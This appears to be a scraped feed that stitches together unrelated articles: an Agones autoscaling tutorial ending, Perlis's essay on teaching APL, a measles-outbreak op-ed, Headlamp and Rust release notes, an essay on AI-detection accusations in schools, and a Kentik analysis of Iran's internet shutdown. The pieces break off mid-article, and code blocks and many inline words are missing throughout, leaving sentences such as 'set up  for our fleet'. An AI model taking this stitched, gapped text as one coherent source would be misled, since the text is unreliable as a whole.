again because I shamelessly copy-pasted the code from the game server as the base for the matchmaking service. However, you would be better off using an HTTP API where you issue a ticket and poll the match result. Or, maybe even SSE?Setting up autoscaling of game serversEverything works pretty well so far, right? Well, there’s still a problem that remains to be solved. If you’ve followed along until now, so far we have a game running on Agones. There are multiple instances and a matchmaking service that routes each player to one of them. However, if we have 6 players all playing at the same time, we’ll end up with our 3 games instances being allocated, making it impossible for the matchmaking service to find a game for any new players.To solve this issue, we have to set up  for our fleet of game servers. To do that, we need to create a FleetAutoscaler:I set it up with a  which ensures that there’s always a buffer of ready game servers available. In this case, I set it to 10 instances which are checked every 5 seconds.There are other policies which are also interesting to look at such as:The counter policy which scales based on a GameServer counter. It can be useful if you set up multiple rooms in a single game instance like I mentioned earlier.The webhook policy which allows us to scale based on a custom logic we can implement as a webhook handler. We can, for instance, scale it based on the number of players waiting in the matchmaking system.The WASM policy which as its name implies, allows us to scale based on a custom logic using WebAssembly modules. I have yet to find a use case for it, but it’s definitely interesting to explore.The Schedule policy which is pretty neat as it allows us to set a policy for a specific time period. It can be useful to scale up during an event or for the release of a game, for example.For simplicity’s sake, we’ll continue with the buffer policy as it works decently well if we set the sync interval to a low value.Now, for the fun part, let’s put this autoscaling to the test!There’s a tool called k6 which is a load testing tool made by Grafana that can be used to simulate a large number of users connecting to our game server. We can use it to test our autoscaling policy and see how it performs under load. It simulates users with a custom script that can be written in JavaScript.Here’s the one I made for this project:As you can see, this script  opens the WebSocket connection with the matchmaking service and just sends a GET request to the game server.We’ll be running this script in k6 with 100 virtual users for a duration of 30 seconds.As you can see, the autoscaler has a hard time keeping up with the load. To avoid that, we can increase the buffer size and decrease the sync interval. Or even better, switch to the webhook policy and implement a webhook endpoint which exposes the number of players currently waiting for a game server allocation.This little experiment with Agones took longer than I first expected it to be, but I learned a lot and had quite some fun. Overall, I would say that Agones is very interesting in the way it transforms how we work with Kubernetes.I think making a game and a matchmaking system from scratch to work with Agones really helped me understand better how concepts would work together. I understood so much more about Agones doing it this way than I did at first when going through the documentation.Still, there are many things I haven’t tried, such as the other autoscaling policies, using counters and lists, or just working with an actual game server with real-time communication in UDP. There are also related projects such as Quilkin which is a UDP proxy that can be used to route traffic to game servers and seems to work well with Agones.I hope this article has been helpful for you and that you have learned something new about Agones and Kubernetes. I would appreciate any feedback you might have on this article.

Perlis
Yale UniversityMany reasons can be given for teaching
one or more aspects of computer
science (defined as the study of the set
of phenomena arising around and because of
the computer) to all university students.
Probably every reader of this note supports
some of these reasons. Let me list
the few I find most important: (1) to
understand and to be able to compose
algorithms; (2) to understand how computers
are organized and constructed; (3) to
develop fluency in (at least) one programming
language; (4) to appreciate the
inevitability of controlling complexity
through the design of systems; (5) to
appreciate the devotion of computer
scientists to their subject and the
exterior consequences (to the student as
citizen) of the science’s development.Even though computer science deals
with symbolic objects whose nature we
study mathematically, it cannot be taught
as an orderly development arising from a
few fundamental ideas whose existence the
student has already observed intuitively
during his maturation, such as gravitation
and electricity.It is during this first computer
course that the student awakes to the
possibilities and consequences of computation.
They arise most usefully and in
greatest profusion during his writing of
programs. He must program and program and
program! He must learn how to state
precisely in a programming language what
he perceives about the nature of symbolic
systems. I know of no better way to
expedite this awakening than by programming.But what should the student program?
and in what language? I do not place much
emphasis on heavy  of other people’s
programs, packages if you will, that
perform real services such as statistical
packages, data management systems, linear
equations solvers, etc. While it is wise
to use standard programs when they match
one’s needs, it is more important to
master self-expression during this initial
contact.Available time is a limiting factor;
a semester provides about 16 weeks of
contact. During that interval the student
must negotiate a set of tasks that sharpens
his abilities and explodes his perceptions
of the computer’s capabilities. He
must be on the computer early and often
during the semester and his approach to it
must be smooth and easy. The computer
system he uses should be time-sharing and
interactive, if you will.Learning to program involves a
sequence of acts of discovery punctuated
by recovery from errors. As the semester
progresses the causes and nature of errors
will change. Certain kinds will diminish
and even disappear, only to be replaced by
errors of deeper significance, harder to
isolate and more resistant to satisfactory
removal — syntactic gaffes give way to
semantic errors — incorrect perceptions
of purpose, improper use of means, the use
of hammers to swat flies and swatters to
level mountains.To write correct and balanced programs
a student may be forced to move
between programs that are not related to
each other by a few simple textual rearrangements.
He must learn to write and
test complicated programs quite rapidly.
As he moves through the sequence of
assigned tasks his ability to express
himself fluently should not founder too
soon because of language shortcomings.
For all of the above reasons as well as a
few others, I have come to believe that
APL is the most rational first language
for a first course in computer science.It is true that BASIC and FORTRAN are
easier to learn than APL, for example, a
week versus a month. However, once
mastered, APL fits the above requirements
much better than either BASIC or FORTRAN
or their successors ALGOL 60, PL/I and
Pascal. The syntax of APL is not a
significant difficulty for the students.
The large number of primitive functions,
at first mind-numbing in their capabilities,
quickly turn out to be easily
mastered, soon almost all are used naturally
in every program — the primitive
functions form a harmonious and useful
set. As a data organization, arrays turn
out to be extraordinarily useful (though
prolonged contact with APL makes one wish
for the added presence of more heterogeneous
structures).The virtues of APL that strike the
programmer most sharply are its 
— complicated acts can be described
briefly, its  — there are a
large number of ways to state even moderately
complicated tasks (the language
provides choices that match divergent
views of algorithm construction), and its
 — there is the possibility
to construct sentences — one-liners as
they are commonly called — that approach
in the flow of phrase organization,
sequencing and imbedding, the artistic
possibilities achievable in natural
language prose.The sweep of the eye across a single
sentence can expose an intricate, ingenious
and beautiful interplay of operation
and control that in other programming
languages is observable only in several
pages of text. One begins to appreciate
the emergence and significance of style
and to observe that reading and writing
facility is tied to the development of an
arsenal of idioms which soon become
engraved in one’s skull as units.The combination of these three
factors makes it possible to develop an
excellent set of exercises in the first
course. These exercises can be large in
number, cover a wide range of topics and
vary widely in complexity, and still be
done during the 16 week period. The later
exercises can be tied to the design and
development of a system — a collection of
procedures that, in varying combinations,
perform a set of tasks.In Teaching Computer OrganizationTo appreciate computer science one
requires an understanding of the computer.
Once the student understands the computer
— its macroscopic components monitored by
the fetch-execute cycle and its apparent
complexity being controlled by gigantic
replication of a few simple logical
elements — he can become aware of the
important equilibrium between hardware and
software — the shifting of function
between the two as determined by economic
factors — and between algorithm and
system as determined by traffic and
variation. Using APL it is straightforward
to model a computer and to illustrate
any of its macroscopic or microscopic
components at any level of detail. The
programs to perform these functions at
every level of description remain small
and manageable — about 40 lines or so.The development of software, e.g., a
machine language assembler, is a task of
similar difficulty (about 40 lines) and
hence possible within the confines of a
first course.Word processing and graphics,
increasingly important application areas
of computers, can be explored with exercises
of no great size, e.g., to do
permuted-index of title lists (~12 lines),
display, rotation and scaling of composites
of polygons (~20 lines), graphing of
functions (~5 lines), etc.With (or even without) the use of 2
or 3 pre-built functions, file processing
problems such as payroll, personnel
search, etc. can be written in a relatively
few lines.An important consequence of the
attainable brevity of these compositions
cannot be ignored: the student becomes
aware that he need not be forced to depend
upon external, pre-packaged and elaborate
systems to do what are really simple
programming tasks. Instead of learning a
new coding etiquette to negotiate a
complex external system, he writes his own
programs, develops his own systems tailor-made
to his own needs and understood at
all levels of detail by him. If anything
is meant by man-machine symbiosis, it is
the existence of such abilities on the man
side of the “membrane”, for there is no
partnership here between man and machine,
merely the existence of a growing, but
never perfectly organized, inventory of
tools that the competent can pick among,
adapt and use to multiply his effective
use of the computer.I cannot overemphasize the importance
of terseness, flexibility and phrase
growth to a beginning student. His
horizons of performance are being set in
this first course. If he sees a task as a
mountain then its reduction to molehill
proportions is itself a considerable
algorithmic task. While this is true of
very large tasks, even when using APL this
conscious chaining of organized reductions
can be postponed until the student has
already collected a large number of useful
data-processing functions, engraved in his
skull, with which to level mountains.It is important to recognize that no
matter how complicated the task, the APL
functions will usually be anywhere from
1/5 to 1/10 the number of statements or
lines, or what have you, of a FBAPP
(FORTRAN or BASIC or ALGOL or PL/I or
Pascal) program. Since APL distributes,
through its primitive functions, control
that the other languages explicate via
sequences of statements dominated by
explicit control statements, errors in APL
programs tend to be far fewer in number
than in their correspondents in FBAPP.I can come now to the topics of
structured programming and program verification.
Both are important, but their
content and importance depend strongly on
the language in which programs are
couched. A program is well-structured if
it has a high degree of lexical continuity:
small changes in program capability
are acquired by making changes within
lexically close text (modularization).Since APL has a greater density of
function within a given lexical scope than
FBAPP, one would expect that APL programs
will support considerably more structure
than equivalent size FBAPP programs. Put
another way, since the APL programs are
1/5 to 1/10 the size of FBAPP programs,
the consequences to APL programs of weak
structuring are less disastrous. Recovery
from design mistakes is more rapid. Since
we can only structure what we already
understand, the delay in arriving at
stable program organization should be
considerably less with FBAPP!Please note that the emphasis here is
on the control of propagation of relationships,
not the nonsense of restricting 
or bathing programs in cascades of
 loops.The verification, formal or informal,
of programs is a natural and important
activity. It is linked to specification:
what we can’t specify we can’t verify. By
specification we mean stating what is to
be output for a given input. We immediately
observe that, since specification in
FBAPP is extremely tedious and unnatural,
we must use some other language. APL
turns out to be quite good and has often
been suggested as a specification language.
Assertions and verification
conditions can be much more easily
expressed as APL predicates than as FBAPP
predicates. Because of the widespread
distribution of control into the semantics
of primitive functions, for which no proof
steps need then be given, APL verifications
tend to be, just as their counterpart
APL programs, shorter and more
analytic than equivalent FBAPP program
verifications.The form of the FBAPP languages
follows closely the structure of the
computers that prevailed during their
inception. They have the nice property
that one may often optimize machine
performance of their compiled programs by
transforming FBAPP programs to other FBAPP
programs. Control of the computer is more
easily exercised with programs in these
languages than with APL, since the latter
is more independent of current machines.
For many programs this control over the
target machine performance is quite vital,
and APL couples more weakly to the standard
computer than does FBAPP.However, new array processing computers
are beginning to appear and, had they
been standard 20 years ago, APL and not
FORTRAN would have been the prototype of
language development. I often wonder at
what descriptive levels we would be
programming today had that been the case!
Since it was not the case, we should not
throw out or limit APL. We must seek ways
to match it to the common computer. We
must design compilers as well as computers
that fit APL better.More Cost-Effective than BASICCost is an important issue in the
instructional process. An APL computer
system currently costs about $10K per
terminal, about twice the cost of a BASIC
system. As APL system designs stabilize
and integrated circuitry costs drop, the
two figures will coincide at or near the
cost of a contemporary terminal. However,
even now the APL system is cheaper than
BASIC systems for equivalent work loads
because one can do more than twice as much
with APL in a given period of time than
with BASIC!Let me mention in closing two additional
issues regarding the use of APL in
an introductory computer science course.
First, most university computer scientists
don’t really  APL. They haven’t
appreciated what it means to think in APL
— to think about parallel operations in
arrays and to distribute and submerge
explicit looping among its primitive
functions. I am reminded of the difficulties
many math departments experience when
they try to replace calculus by a fine
math and combinatorics course as the first
meat and potatoes offering by the department
to the university. However at Yale
we have found that faculty outside the
software milieu — in theory, for example
— pick up APL quite fast and prefer it to
FBAPP. I am sure the same is true elsewhere.The second issue is of a different
kind. I am firmly convinced that APL and
LISP are related to each other along an
important axis of language design and that
acquiring simultaneous expertise in both
languages is possible and desirable for
the beginning student. Were they unified,
the set of tasks that succumb to terse,
flexible and expressive descriptions will
enlarge enormously without overly increasing
the intellectual burden on the student
over his initial 16 week contact period.Above all, remember what we must
provide is a  to last the student
for 40 years, not a handbook for tomorrow’s
employment.]]></content:encoded></item><item><title>Using Go Workspaces?

That’s a general statement, to be sure, so if you need some marking point to serve as a specific example of our national malfunction, the return of measles to our country can fit the bill. It’s not quite as flashy as the secret police shooting citizens, of course. But I think that there is something about children with angry rashes across their necks sitting in hospital beds, or in body bags, that will have a way of clarifying the mind.With a grifter like RFK Jr. at the helm of American health, having built a career based on anti-vaxxer conspiracy theories and health misinformation, our country became a fertile host once more to this horrific disease. Kennedy’s inability to properly communicate to the nation what needs to happen, which is another concentrated MMR vaccination effort, combined with his eugenics-lite belief system on matters of health, has all led to this. 2025 saw the highest number of Americans infected by measles in decades, 3 people died, we’re about to lose our elimination status for the disease, and an outbreak in South Carolina has us off to a rip roaring start to 2026.While this is largely due to the unvaccinated population among us, allowing the disease to spread where it otherwise would not, we’ve seen enough breakthrough infections that even being one of the “responsible ones” won’t necessarily keep you safe any longer. And the South Carolina outbreak of measles is officially off the rails.A week ago, ArsTechnica had an alarming post about how South Carolina saw well over a hundred new cases of measles and over 400 people quarantined . Amid the outbreak, South Carolina health officials have been providing updates on cases every Tuesday and Friday. On Tuesday, state health officials reported 124 more cases since last Friday, which had 99 new cases since the previous Tuesday. On that day, January 6, officials noted a more modest increase of 26 cases, bringing the outbreak total at that point to 211 cases.With the 3-month-old outbreak now doubled in just a week, health officials are renewing calls for people to get vaccinated against the highly infectious virus—an effort that has met with little success since October. Still, the health department is activating its mobile health unit to offer free measles-mumps-rubella (MMR) vaccinations, as well as flu vaccinations at two locations today and Thursday in the Spartanburg area, the epicenter of the outbreak.Those same officials had another dire warning: the outbreak had grown so big that they no longer had the ability to perform contact tracing. Where the disease would go next was anyone’s guess.The outbreak is still growing to date. At least 88 more cases of measles were recorded in South Carolina in less than a week since the Ars post. Schools remain the most problematic vector, but it’s no longer just elementary and secondary schools that are in trouble. Colleges are now part of the party.There are at least 15 schools — including elementary, middle and high schools — which currently have students in quarantine.Health officials also warned of exposures at Clemson University and Anderson University, both located in northwestern South Carolina, which have a combined 88 students in quarantine.While these numbers from South Carolina are publicly stated, the CDC site tallying measles infections apparently can’t keep up. The last time the numbers were updated there was January 14th, but even those numbers appear to be incorrectly low. The site also announces that it is moving its reporting schedule from every Wednesday to Fridays, which is your classic “bad news dumping ground” day. Measles continue to spread in the Upstate but now, health leaders in Washington state say the outbreak here in South Carolina is connected to cases on the west coast. The Snohomish County Health Department confirmed three cases in children who were exposed to a contagious family visiting from South Carolina.Previously, the Snohomish County Health Department and Public Health – Seattle & King County were notified that three members of a South Carolina family, one adult and two children, were infectious while visiting King and Snohomish counties from Dec. 27, 2025 through Jan. 1, 2026. The family visited multiple locations in Everett, Marysville and Mukilteo while contagious before being diagnosed. They also traveled through Seattle-Tacoma International Airport and visited a car rental facility near the airport.In any sane administration, a measles task force would be mobilized to build out a strategy to contain these outbreaks, to communicate actions plans to the public, and to execute on actions designed to keep the public healthy. Trump, RFK Jr., and the health agencies they’re in charge of are barely talking about this. They are ignoring the problem and that will ensure that it becomes much, much worse.Impeachments are what’s necessary here, starting with Kennedy, who is clearly asleep at the wheel. A feckless Congress unwilling to do its job should have members tossed out on their ass. Staff at HHS and its child agencies should be in full revolt, sounding the alarm.Measles is no fucking joke, folks. But our government currently is.]]></content:encoded></item><item><title>This Week in Rust #635</title><link>https://this-week-in-rust.org/blog/2026/01/21/this-week-in-rust-635/</link><author>/u/b-dillo</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 04:13:35 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[This week's crate is throttled-tracing, a crate of periodic and throttled logging macros.An important step for RFC implementation is for people to experiment with the

The project has continued to grow – reaching more teams across platforms, powering new workflows and integrations through plugins, and seeing increased collaboration from the broader community.We wanted to take a moment to share a few updates and highlight how Headlamp has evolved over the past year.Joining Kubernetes SIG UIThis year marked a big milestone for the project: Headlamp is now officially part of Kubernetes SIG UI. This move brings roadmap and design discussions even closer to the core Kubernetes community and reinforces Headlamp’s role as a modern, extensible UI for the project.Linux Foundation mentorshipThis year, we were excited to work with several students through the Linux Foundation’s Mentorship program, and our mentees have already left a visible mark on Headlamp: built the KEDA plugin, adding a UI in Headlamp to view and manage KEDA resources like ScaledObjects and ScaledJobs. set up an OpenTelemetry-based observability stack for Headlamp, wiring up metrics, logs, and traces so the project is easier to monitor and debug. led a UX audit of Headlamp plugins, identifying usability issues and proposing design improvements and personas for plugin users. developed the Karpenter plugin, giving Headlamp a focused view into Karpenter autoscaling resources and decisions. improved Gateway API support, so you can see networking relationships on the resource map, as well as improved support for many of the new Gateway API resources. worked on backend caching for Kubernetes API calls, reducing load on the API server and improving performance in Headlamp.Managing multiple clusters is challenging: teams often switch between tools and lose context when trying to see what runs where. Headlamp solves this by giving you a single view to compare clusters side-by-side. This makes it easier to understand workloads across environments and reduces the time spent hunting for resources.View of multi-cluster workloadsKubernetes apps often span multiple namespaces and resource types, which makes troubleshooting feel like piecing together a puzzle. We’ve added  to give you an application-centric view that groups related resources across multiple namespaces – and even clusters. This allows you to reduce sprawl, troubleshoot faster, and collaborate without digging through YAML or cluster-wide lists.View of the new Projects featureNew “Projects” feature for grouping namespaces into app- or team-centric projectsExtensible Projects details view that plugins can customize with their own tabs and actionsNavigation and ActivitiesDay-to-day ops in Kubernetes often means juggling logs, terminals, YAML, and dashboards across clusters. We redesigned Headlamp’s navigation to treat these as first-class “activities” you can keep open and come back to, instead of one-off views you lose as soon as you click away.A new task bar/activities model lets you pin logs, exec sessions, and details as ongoing activitiesAn activity overview with a “Close all” action and cluster informationMulti-select and global filters in tablesWhen something breaks in production, the first two questions are usually “where is it?” and “what is it connected to?” We’ve upgraded both search and the map view so you can get from a high-level symptom to the right set of objects much faster.View of the new Advanced Search featureAn Advanced search view that supports rich, expression-based queries over Kubernetes objectsImproved global search that understands labels and multiple search items, and can even update your current namespace based on what you findEndpointSlice support in the Network sectionA richer map view that now includes Custom Resources and Gateway API objectsWe’ve put real work into making OIDC setup clearer and more resilient, especially for in-cluster deployments.View of user information for OIDC clustersUser information displayed in the top bar for OIDC-authenticated usersPKCE support for more secure authentication flows, as well as hardened token refresh handlingDocumentation for using the access token using -oidc-use-access-token=trueImproved support for public OIDC clients like AKS and EKSWe’ve broadened how you deploy and source apps via Headlamp, specifically supporting vanilla Helm repos.A more capable Helm chart with optional backend TLS termination, PodDisruptionBudgets, custom pod labels, and moreImproved formatting and added missing access token arg in the Helm chartNew in-cluster Helm support with an  flag and a service proxyFinally, we’ve spent a lot of time on the things you notice every day but don’t always make headlines: startup time, list views, log viewers, accessibility, and small network UX details. A continuous accessibility self-audit has also helped us identify key issues and make Headlamp easier for everyone to use.View of the Learn section in docsSignificant desktop improvements, with up to 60% faster app loads and much quicker dev-mode reloads for contributorsNumerous table and log viewer refinements: persistent sort order, consistent row actions, copy-name buttons, better tooltips, and more forgiving log inputsAccessibility and localization improvements, including fixes for zoom-related layout issues, better color contrast, improved screen reader support, and expanded language coverageMore control over resources, with live pod CPU/memory metrics, richer pod details, and inline editing for secrets and CRD fieldsA refreshed documentation and plugin onboarding experience, including a “Learn” section and plugin showcaseA more complete NetworkPolicy UI and network-related polishNightly builds available for early testingPlugins and extensibilityDiscovering plugins is simpler now – no more hopping between Artifact Hub and assorted GitHub repos. Browse our dedicated Plugins page for a curated catalog of Headlamp-endorsed plugins, along with a showcase of featured plugins.View of the Plugins showcaseManaging Kubernetes often means memorizing commands and juggling tools. Headlamp’s new AI Assistant changes this by adding a natural-language interface built into the UI. Now, instead of typing  or digging through YAML you can ask, “Is my app healthy?” or “Show logs for this deployment,” and get answers in context, speeding up troubleshooting and smoothing onboarding for new users. Learn more about it here.Alongside the new AI Assistant, we’ve been growing Headlamp’s plugin ecosystem so you can bring more of your workflows into a single UI, with integrations like Minikube, Karpenter, and more.Highlights from the latest plugin releases:Minikube plugin, providing a locally stored single node Minikube clusterKarpenter plugin, with support for Azure Node Auto-Provisioning (NAP)KEDA plugin, which you can learn more about hereAlongside new additions, we’ve also spent time refining plugins that many of you already use, focusing on smoother workflows and better integration with the core UI.View of the Backstage plugin: Updated for Flux v2.7, with support for newer CRDs, navigation fixes so it works smoothly on recent clusters: Now supports Helm repos in addition to Artifact Hub, can run in-cluster via /serviceproxy, and shows both current and latest app versions: Improved card layout and accessibility, plus dependency and Storybook test updates: Dependency and build updates, more info hereWe’ve focused on making it faster and clearer to build, test, and ship Headlamp plugins, backed by improved documentation and lighter tooling.View of the Plugin Development guideImproved type checking for Headlamp APIs, restored Storybook support for component testing, and reduced dependencies for faster installs and fewer updatesDocumented plugin install locations, UI signifiers in Plugin Settings, and labels that differentiated shipped, UI-installed, and dev-mode pluginsWe've also been investing in keeping Headlamp secure – both by tightening how authentication works and by staying on top of upstream vulnerabilities and tooling.We've been keeping up with security updates, regularly updating dependencies and addressing upstream security issues.We tightened the Helm chart's default security context and fixed a regression that broke the plugin manager.We've improved OIDC security with PKCE support, helping unblock more secure and standards-compliant OIDC setups when deploying Headlamp in-cluster.Thank you to everyone who has contributed to Headlamp this year – whether through pull requests, plugins, or simply sharing how you're using the project. Seeing the different ways teams are adopting and extending the project is a big part of what keeps us moving forward. If your organization uses Headlamp, consider adding it to our adopters list.If you haven't tried Headlamp recently, all these updates are available today.

Now what was I going to do?For years I used my pencil as a key aid in the writing process with my students. It was collaborative because we worked together – I would suggest ideas an reframe sentences and thoughts to model writing in line with whatever rubric my assignment called for. Often times students adopted my suggestions whole-cloth, other times we would workshop different stylistic choices. My students and I shared in the rhetorical process. If they chose to use my margin note “try something like this,” are they not able to claim ownership because the original words were mine and not theirs?I was the human intelligence that helped guide my students. They took my advice and incorporated it often. Other times they vehemently opposed my suggestions. I was their personal ChatGPT and I enjoyed that work immensely. But it was often brief and temporal, because I only had so much time to visit individually with 75 students. Can we really now castigate a tool that students can have beside them during every moment of their learning journey?The ethical dilemma is this: students could accept, reject, argue with, or ignore me. Today, institutions now assume AI outputs are automatically suspect while often students see them as automatically authoritative. Agency is the key issue. When I suggested phrasing, students exercised their agency to decide whether to adopt or reject my suggestions. My authority was negotiable and if they accepted my suggestions, even verbatim, authorship was never in question.Students are struggling today with teachers making them think AI is a “forbidden oracle,” whereas teachers are also short-sighted in thinking Turnitin is an infallible detector. The problem is in both cases human judgment is being “outsourced.” In 1999, I trusted my students negotiate my (human) guidance; now we pretend that same negotiation between students and AI itself is the problem. What mattered was not that I was always right; but that my authority was provisional.Fast forward almost 30 years and now we not only have a tool for students to generate a decent five-paragraph essay, but a second tool that claims it can detect the use of the first. And that tool is the same one I struggled to understand in 1999: Turnitin. Although this time Turnitin is losing the battle against this newer tool, and students all over academia are suffering from that loss.Academia now is forced to embrace a structure that rewards certainty over caution. Boom: you get the AI-cheating accusation era. We’re living in a time where a student can be treated like they robbed a bank because a dashboard lit up yellow. Is this how math teachers felt about calculators when they first entered the scene? Can you today imagine any high-level mathematics course that didn’t somehow incorporate this tool? Is ChatGPT the “writing calculator” that in decades will sit beside every student in an English class along with that No. 2 Dixon Ticonderoga? Or will pencils continue to suffer a slow extinction?I’m not writing this because I think academic dishonesty is cute. Students absolutely can use AI to outsource thinking, and pretending otherwise is naïve. I’m writing this because the process of accusing students is an ethical problem now. It’s not just “Are people cheating?” It’s “What evidence counts, who bears the burden, and how much harm are we willing to cause to catch some portion of cases?” When a school leans on AI detectors as objective arbiters, the ethics get ugly fast: false positives, biased outcomes, coerced confessions, and a general atmosphere of suspicion that corrodes learning.I believe it is ethically wrong to treat AI-detection scores as dispositive evidence of misconduct; accusations should require due process and corroborating evidence. current detectors are error-prone and easy to game, and the harms of false accusations are severe. If institutions want integrity, they should design integrity—through assessment design, and clear AI-use policies, not outsource judgment to probabilistic software and call it “accountability.” MIT’s teaching-and-learning guidance says this bluntly: AI detection has high error rates and can lead to false accusations; educators should focus on policy clarity and assessment design instead of policing with detectors.

This post uses Kentik data to detail how this historic event unfolded, where this event lies in the context of previous Iranian shutdowns, and finally discusses what might be in store next for Iran.For nearly two weeks, Iran has been enduring one of the most severe internet shutdowns in modern history. The theocratic regime’s decision to restrict communications coincided with a violent nationwide crackdown on a growing protest movement driven by worsening economic hardship.In this post, I explore the situation in Iran using Kentik’s aggregate NetFlow data, along with other sources.At the time of this writing, a near-complete internet shutdown has persisted for almost 14 days. Along with internet services, international voice calling has also been blocked (there have been a couple of periods when limited outgoing calls were allowed), and domestic communication services have experienced extended disruptions, including Iran’s National Information Network. For a country of 90 million people, the combined blocking of these communication modes makes this blackout one of the most severe in history.To learn more about the conditions that lead to the check out this special episode of Kentik’s Telemetry Now podcast with Iranian digital rights expert Amir Rashidi, Director of Digital Rights and Security at the human rights organization Miaan Group:For decades, the internet of Iran has been connected to the world via two international gateways:IPM, primarily a university and research network, was the country’s original internet connection in the 1990s, a story covered in the excellent book The Internet of Elsewhere by Cyrus Farivar. Years later, the state telecom TIC got into the business of providing internet service and today handles the vast majority of internet traffic into and out of Iran.Despite TIC’s dominance, IPM has maintained a technologically independent connection to the outside world, though it has never been immune from Iranian government censorship and surveillance. This distinction matters because each gateway behaved differently during the shutdown.In the days leading up to January 8, there were many reports of localized internet blockages around the country, but these incidents weren’t big enough to register on any of our national traffic statistics for Iran.The first major development occurred at 11:42 UTC on January 8, 2026, when TIC (AS49666) began withdrawing its IPv6 BGP routes from its sessions with other networks. Within hours, nearly all of Iran’s IPv6 routing had disappeared from the global routing table.However, based on our aggregate NetFlow, IPv6 traffic normally amounts to less than 1% of the overall traffic (in bits/sec) into Iran, so the average Iranian was unlikely to be affected by this issue. Regardless, the withdrawal of IPv6 routes appeared to be an early indication of what was to come later in the day.Following a brief disruption, we observed internet traffic levels begin to plummet at 16:30 UTC (7pm local). The drop continued until internet traffic into Iran had all but ceased by 1845 UTC, as illustrated below. It took over two hours to stop all internet traffic into and out of the country.At 19:00 UTC, we observed TIC disconnecting from a subset of its transit providers, including Russian state telecom Rostelecom (AS12389) and regional operator Gulf Bridge International (AS200612), and all of its settlement-free peers.Despite the loss of numerous BGP adjacencies for AS49666 (TIC), the vast majority of Iranian IPv4 routes continued to be routed globally. The drop in Iranian IPv4 traffic, therefore, could not be explained by reachability issues; another mechanism was at work at the network edge blocking traffic.Georgia Tech’s IODA tool captures this divergence well. In the below screenshot, active probing (blue) drops to zero as traffic is blocked, while routed IPv4 space in BGP (green) is almost completely unscathed (98.14%).Although IPv4 routes remained online, internet traffic stopped for roughly 90 million Iranians. This distinction is central to Iran’s next step: internet “whitelisting,” in which an Iranian version of the Chinese Great Firewall allows only approved users or services while blocking all others. Had authorities withdrawn IPv4 routes, as they did with IPv6, Iran would have become completely unreachable, as Egypt was in January 2011. By keeping IPv4 routes in circulation, Iranian authorities can selectively grant full internet access to specific users while denying it to the broader population.As mentioned above, the internet shutdown in Iran is not complete. There has been a tiny amount of traffic still trickling in and out as a small set of Iranians continue to enjoy internet access.From our data, we have also observed the emergence of a diurnal pattern of traffic to AS49666 emerge on January 13. AS49666 is not typically a major terminus for internet traffic to Iran, so this traffic is likely proxied traffic from whitelisted individuals or services.Evolving calculus of shutdowns in IranBack in 2012, Iran was in the beginning stages of building its National Information Network (NIN), ostensibly built to allow the country to continue to function in the event that it was cut off from the outside world. At the time, I teamed up with Iran researcher Collin Anderson to investigate. With access to in-country servers, we mapped Iran’s national internet from the inside (research published here).We found that the NIN had been implemented by routing RFC1918 address space (specifically 10.x.x.x) between Iranian ASes within the country. By doing so, they could be assured that devices connected to the NIN would not be able to receive connections from the outside world, as those IP addresses are not routable on the public internet.In 2019, I reported on Iran’s internet shutdown following the government’s decision to raise gas prices. At the time, it was the most severe shutdown in the country’s history—until this month. It involved withdrawing BGP routes of some networks while blocking traffic of others, and lasted for almost two weeks.Initial impacts of the 2019 Iranian internet shutdown in the Oracle Intelligence Map.Nightly traffic drops for Iranian mobile providers during Iran’s internet curfew in 2022.The article described internet curfews as another means of reducing the costs of shutdowns, not unlike the development of the NIN, according to Iranian digital rights expert Amir Rashidi. In that post, we wrote:The objective of internet curfews, like Iran’s NIN, is to reduce the cost of shutdowns on the authorities that order them. By reducing the costs of these shutdowns, they become a more palatable option for an embattled leader and, therefore, are likely to continue in the future.Timeline for the stages of the Iranian internet shutdown during the Twelve-Day War.The outage demonstrated Iran’s newfound ability to block traffic nationwide without manipulating BGP routes, signaling a higher level of sophistication in its internet filtering. This summer’s Stealth Blackout ultimately foreshadowed the ongoing shutdown Iran is now enduring.In the aftermath of the 2022 protests, Starlink began allowing connections from Iran. Satellite internet operators like Starlink must typically clear, at a minimum, two legal hurdles to operate in a country: a telecom license and radio spectrum authorization from the local government. Starlink has been operational in Iran for over three years at this point without either, and the Iranian government has taken note.The ITU Radio Regulations Board (RRB) is a quasi-judicial United Nations body that interprets and applies the Radio Regulations, to include satellite emissions. It exists to resolve disputes between countries and oversees compliance with the international radio frequency register, but, in the end, has no direct enforcement power.“Request the Administration of the Islamic Republic of Iran to pursue its efforts, to the extent possible, to identify and deactivate unauthorized STARLINK terminals in its territory,Strongly urge the Administration of Norway to take all appropriate actions at its disposal to have the operator of the Starlink system immediately disable unauthorized transmissions of its terminals within the territory of the Islamic Republic of Iran.”Regardless of the decisions of this body, Starlink continues to operate in the country. (Note: The US and Norway share responsibility for Starlink’s ITU registration.)Other governments are watching, learningIn the decade and a half since the internet shutdowns of the Arab Spring, we’ve observed the practice of suppressing communications evolve as authoritarian governments learn tactics from one another. In the ongoing shutdown in Iran, multiple such tactics are on display.To mitigate the costs of its shutdown, the Iranian government has created an internal national internet and appears to be in the process of building a “whitelisting” system to allow certain individuals and services internet access while blocking the rest. If these measures successfully enable an unpopular Iranian government to remain in power, we can expect to see them replicated elsewhere.On the other side, the digital rights activists have also been building tools, funded in large part by the now-embattled Open Technology Fund, to allow communications to continue during a shutdown like this.

Rust is a programming language empowering everyone to build reliable and efficient software.If you have a previous version of Rust installed via , you can get 1.93.0 with:If you'd like to help us out by testing future releases, you might consider updating locally to use the beta channel () or the nightly channel (). Please report any bugs you might come across!
Update bundled musl to 1.2.5The various  targets now all ship with musl 1.2.5. This primarily affects static musl builds for , , and  which bundled musl 1.2.3. This update comes with several fixes and improvements, and a breaking change that affects the Rust ecosystem.For the Rust ecosystem, the primary motivation for this update is to receive major improvements to
musl's DNS resolver which shipped in 1.2.4 and received bug fixes in 1.2.5. When using 
targets for static linking, this should make portable Linux binaries that do networking more
reliable, particularly in the face of large DNS records and recursive nameservers.
Allow the global allocator to use thread-local storageRust 1.93 adjusts the internals of the standard library to permit global allocators written in Rust
to use std's  and
 without
re-entrancy concerns by using the system allocator instead. attributes on  linesPreviously, if individual parts of a section of inline assembly needed to be 'd, the full 
block would need to be repeated with and without that section. In 1.93,  can now be applied to
individual statements within the  block.Many people came together to create Rust 1.93.0. We couldn't have done it without all of you.

